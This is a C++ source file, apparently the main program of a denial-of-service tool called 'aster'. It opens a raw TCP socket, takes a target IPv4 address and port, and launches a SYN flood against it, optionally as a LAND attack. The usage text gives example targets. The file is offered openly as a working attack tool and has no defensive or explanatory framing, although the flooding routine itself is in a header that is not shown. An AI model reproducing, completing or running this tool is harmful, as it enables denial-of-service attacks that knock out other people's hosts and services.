#include <iostream>
#include <vector>
#include <regex>
#include <unistd.h>

#include"include/syn_flood.hpp"
#include"include/network.hpp"

using namespace std;

const vector<string> usage = {
    "Usage: aster -syn -l [destination] -p <port>\n\n",

    "Description:\n",
    "   -s: syn flood\n",
    "       -l: LAND Attack\n",
    "   [destination]: destination IP address\n",
    "   -p <port>: destination port\n\n",

    "Example:"
    "   aster 192.168.1.1\n"
    "   aster -s 192.168.1.1\n",
    "   aster -s -l 192.168.1.1\n",
    "   aster -s 192.168.1.1 -p 80\n"
};

int sock;
char dest_addr[30], src_addr[30];
// Destination port Default = 80, source port
int dport = 80, sport, temp_port;
// Flag for LAND attack(Default = false) Flag for SYN flood attack(Default = true)
bool flagLAND = false, flagSYN = true;
int opt;

void print_usage(int exit_){
    for(string s : usage)
        cout << s << endl;
    exit(exit_);
}

int main(int argc, char* argv[])
{
    // Initialize socket as raw, tcp socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);


    // If there is no arguments
    if (argc == 1)
        print_usage(EXIT_SUCCESS);


    // Option Parsing
    while ((opt = getopt(argc, argv, "hslp:")) != -1){
        switch (opt)
        {
            case 'l':
                flagLAND = true;
                break;
            case 'p':
                temp_port = is_valid_port(optarg);

                if (is_valid_port(optarg) != -1)
                    dport = temp_port;
                else {
                    cerr << "Port number is wrong!" << endl;
                    exit(EXIT_FAILURE);
                }
                break;
            
            case 's':
                flagSYN = true;
                break;
            case 'h':
                print_usage(EXIT_SUCCESS);

                break;
            default:
                for(string s : usage)
                    cout << s << endl;
                print_usage(EXIT_FAILURE);

                break;
        }
    }

    if (optind < argc) {
        while (optind < argc){
            string arg_str(argv[optind++]);
            if (is_valid_IPv4(arg_str))
                strcpy(dest_addr, arg_str.c_str());
            else
                print_usage(EXIT_FAILURE);
        }
    }


    if (strcmp(dest_addr, "") == 0)
        print_usage(EXIT_FAILURE);


    if (flagSYN){
        cout << "Start SYN flooding.." << endl;
        syn_flood(sock, dest_addr, dport, flagLAND);
    }
        

    return 0;
}